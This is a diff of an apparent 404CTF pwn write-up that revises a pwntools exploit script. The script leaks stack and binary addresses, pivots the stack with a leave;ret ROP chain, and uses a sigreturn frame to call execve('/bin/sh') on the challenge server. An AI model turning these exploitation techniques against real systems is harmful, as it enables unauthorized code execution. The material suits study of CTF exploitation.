@@ -277,13 +277,10 @@ And get a shell.
 ```
 from pwn import *
 import re
-import time
+from time import sleep
 
 context.arch = 'amd64'
 context.os = 'linux'
-
-#p = remote('challenges.404ctf.fr', 32468)
-p = process('./chall')
 
 
 def extract(data):
@@ -298,58 +295,64 @@ def extract(data):
         print("Leak pattern not found.")
     return addrs
 
-addrs = []
-for i in range(22, 45):
-    data = p.recv()
-    if i == 32 or i == 40:
-        print(f"FOR I = {i}")
-        print(data)
-        addrs.append(extract(data))
-    p.sendline(b"a"*(i))
+for x in [48]:
+	for y in range(1):
+	    for z in range(1):
+	        p = remote('challenges.404ctf.fr', 32468)
+	        #p = process('./chall')
 
-p.recv()
-print(addrs)
+	        addrs = []
+	        for i in range(22, 45):
+	            data = p.recv()
+	            if i == 32 or i == 40:
+		            print(f"FOR I = {i}")
+		            print(data)
+		            addrs.append(extract(data))
+	            p.sendline(b"a"*(i))
 
-gdb.attach(p, gdbscript='''
-b read
-''')
+	        print(f"RECV # 1 {p.recv()}")
+	        print(addrs)
 
-main_offset = 0x443
-buffer_addr = addrs[0] - 48
-base_addr = addrs[1] - 0x443
-leave_ret = base_addr + 0x0000000000000367
-set_read = base_addr + 0x377
-syscall_addr = base_addr + 0x364
-set_rax = base_addr + 0x32e
+	        #gdb.attach(p, gdbscript='''
+	        #b read
+	        #''')
+	        try:
+	            main_offset = 0x443
+	            base_addr = addrs[1] - 0x443
+	            leave_ret = base_addr + 0x0000000000000367
+	            set_read = base_addr + 0x377
+	            syscall_addr = base_addr + 0x364
+	            set_rax = base_addr + 0x32e
 
-print(f"leave ret gadget : {hex(leave_ret)}")
-
-fake_rbp_1 = addrs[0] - 48
-print(f"base rbp : {hex(fake_rbp_1)}")
-
-x = 13
-y = 0
-payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+x) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" + p64(fake_rbp_1) + p64(leave_ret)
-print(f"[+] Send payload of length {hex(len(payload))}")
-
-p.sendline(payload)
-p.recv()
-
-frame = SigreturnFrame()
-frame.rax = 59                      # syscall number for execve
-frame.rdi = fake_rbp_1+296            # pointer to "/bin/sh"
-frame.rsi = 0
-frame.rdx = 0
-frame.rip = syscall_addr            # address of `syscall` instruction
-frame.rsp = fake_rbp_1         # stack after syscall (can be just garbage)
-
-
-payload = p64(fake_rbp_1+40) + p64(set_rax) + p64(15) + p64(syscall_addr) + bytes(frame) + b"/bin/sh\x00"
-payload += b"b"*(0x100-len(payload))
-
-p.sendline(payload)
-p.interactive()
-p.close()
+	            print(f"leave ret gadget : {hex(leave_ret)}")
+	            print(f"set read gadget : {hex(set_read)}")
+	            print(f"X X X X X X = {x}")
+	            fake_rbp_1 = addrs[0] - x
+	            print(f"base rbp : {hex(fake_rbp_1)}")
+	            #gdb.attach(p, gdbscript='q')
+	            payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+15) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" + p64(fake_rbp_1) + bytes([p64(leave_ret)[0]]) + bytes([p64(leave_ret)[1]]) + bytes([p64(leave_ret)[2]]) + bytes([p64(leave_ret)[3]]) + bytes([p64(leave_ret)[4]]) + bytes([p64(leave_ret)[5]])
+	            print(f"[+] Send payload of length {hex(len(payload))}")
+	        
+	        except:
+	            continue
+	        
+	        frame = SigreturnFrame()
+	        frame.rax = 59                      # syscall number for execve
+	        frame.rdi = fake_rbp_1+296          # pointer to "/bin/sh"
+	        frame.rsi = 0
+	        frame.rdx = 0
+	        frame.rip = syscall_addr            # address of `syscall` instruction
+	        frame.rsp = fake_rbp_1         # stack after syscall (can be just garbage)
+	        try:
+	            payload = p64(fake_rbp_1+32) + p64(set_read) + p64(fake_rbp_1+16) + b"\x40\x01\x00\x00" + b"\x00\x00\x00\x00" + p64(fake_rbp_1) + bytes([p64(leave_ret)[0]]) + bytes([p64(leave_ret)[1]]) + bytes([p64(leave_ret)[2]]) + bytes([p64(leave_ret)[3]]) + bytes([p64(leave_ret)[4]]) + bytes([p64(leave_ret)[5]])
+	            print(f"[+] Send payload of length {hex(len(payload))}")
+	            payload += p64(fake_rbp_1+40) + p64(set_rax) + p64(15) + p64(syscall_addr) + bytes(frame) + b"/bin/sh\x00"
+	            #payload += b"\x00"*(0x140-len(payload)-3)
+	            p.sendline(payload)
+	        except:
+	            pass    
+	        p.interactive()
+	        p.close()
 
 
 """
